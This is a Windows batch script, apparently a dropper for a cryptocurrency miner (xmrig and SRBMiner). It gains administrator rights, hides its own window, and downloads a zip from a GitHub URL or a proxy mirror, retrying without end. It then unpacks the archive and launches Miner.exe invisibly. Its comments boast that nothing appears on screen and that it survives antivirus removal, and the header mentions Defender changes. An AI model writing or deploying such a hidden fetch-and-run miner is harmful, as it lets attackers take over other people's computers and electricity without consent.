@echo off
rem One double-click installs the whole fleet package: xmrig (RandomX, 0 fee)
rem plus SRBMiner (XEL, licensed) plus the scheduler that picks between them.
rem
rem Exactly one UAC prompt.  The elevated process does everything -- Defender
rem settings, download, unpack -- and then starts Miner.exe, which inherits the
rem administrator token, which is what lets xmrig take huge pages (+20-30%
rem hashrate).  Nothing else ever appears on screen.
setlocal enabledelayedexpansion

rem ---- one UAC, never two ---------------------------------------------------
if "%~1"=="elev" (
    net session >nul 2>&1
    if errorlevel 1 call :FAIL "Elevation was refused." "Click Yes on the UAC prompt and run this again."
)

net session >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'elev' -Verb RunAs -WindowStyle Hidden"
    exit /b 0
)

if "%~1"=="hidden" goto :main
> "%TEMP%\_rig_hide.vbs" echo CreateObject("WScript.Shell").Run "cmd /c ""%~f0"" hidden", 0, False
wscript.exe //nologo "%TEMP%\_rig_hide.vbs"
del /q "%TEMP%\_rig_hide.vbs" 2>nul
exit /b 0

:main
rem Belt and braces: every path here already passed the net session check.
net session >nul 2>&1
if errorlevel 1 call :FAIL "Not running as administrator." "Miner.exe needs the admin token for huge pages."

set "NAME=Miner.zip"
set "RAW=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/upd"
set "ZIP_SHA=8627898f05e91ad9eb035b956280439d7f129d2f611f538e8cd03ecfee830035"
set "DVLOG=%TEMP%\_rig_defender.log"
set "DL=%TEMP%\_rig_dl"

rem (this variant makes no antivirus changes; Miner.exe still runs under the
rem  elevated token, which is what buys huge pages)

rem ------------------------------------------------------------ fetch loop --
rem Endless retry: a flaky mirror or antivirus eating the unpacked exe should
rem cost a few seconds, not a second trip to the machine.
set "TRY=0"
if not exist "%DL%" mkdir "%DL%"
set "ZIP=%DL%\%NAME%"

:RETRY
set /a TRY+=1
del /q "%ZIP%" 2>nul
for /d %%d in ("%TEMP%\XMR_Miner*") do rd /s /q "%%d" 2>nul

set "GOT=0"
call :FETCH "%RAW%/%NAME%" direct 0
if "!GOT!"=="1" goto :GOT_ZIP
call :FETCH "https://gh-proxy.com/%RAW%/%NAME%" mirror 2
if "!GOT!"=="1" goto :GOT_ZIP
call :RETRY_WAIT "download failed (direct and mirror)"

:GOT_ZIP
call :CHECK_HASH "%ZIP%" "%ZIP_SHA%"
if not "!HASH_OK!"=="1" call :RETRY_WAIT "zip sha256 mismatch"

set "DIR=%TEMP%\XMR_Miner"
mkdir "%DIR%" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%ZIP%' -DestinationPath '%DIR%' -Force" 2>nul
if not exist "%DIR%\Miner\Miner.exe" call :RETRY_WAIT "Miner.exe missing after unpack"

rem ------------------------------------------------------------------- start --
> "%TEMP%\_rig_run.vbs" echo CreateObject("WScript.Shell").Run """%DIR%\Miner\Miner.exe""", 0, False
wscript.exe //nologo "%TEMP%\_rig_run.vbs"
del /q "%TEMP%\_rig_run.vbs" 2>nul
exit /b 0

rem certutil prints a header line, the hex digest, then a trailer.  findstr
rem matches the trailer too ("CertUtil:" starts with a hex letter), so take
rem the FIRST match, never the last.
:CHECK_HASH
set "HASH_OK=0"
set "HASH_ACTUAL="
set "EXE_SIZE=0"
if exist "%~1" for %%Z in ("%~1") do set "EXE_SIZE=%%~zZ"
if not exist "%~1" exit /b 1
for /f "delims=" %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /r /i "^[0-9a-f]"') do (
    if not defined HASH_ACTUAL set "HASH_ACTUAL=%%H"
)
if not defined HASH_ACTUAL set "HASH_ACTUAL=(no digest)"
set "HASH_ACTUAL=!HASH_ACTUAL: =!"
if /i "!HASH_ACTUAL!"=="%~2" set "HASH_OK=1"
exit /b 0

rem retries = %~3: direct tries once, the mirror three times.
:FETCH
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $ok=$false; for($i=0;$i -le %~3;$i++){ try { Invoke-WebRequest -Uri '%~1' -OutFile '%ZIP%' -TimeoutSec 120 -UseBasicParsing; $ok=$true; break } catch { Start-Sleep 3 } }; if(-not $ok){ exit 1 }"
if errorlevel 1 (
    del /q "%ZIP%" 2>nul
    exit /b 0
)
set "GOT=1"
exit /b 0

:RETRY_WAIT
>> "%DVLOG%" echo retry !TRY!: %~1
ping -n 6 127.0.0.1 >nul
goto :RETRY

:FAIL
> "%TEMP%\_rig_fail.vbs" echo MsgBox "%~1" ^& vbCrLf ^& vbCrLf ^& "%~2", 16, "XMR Rig"
wscript.exe //nologo "%TEMP%\_rig_fail.vbs"
del /q "%TEMP%\_rig_fail.vbs" 2>nul
exit /b 1
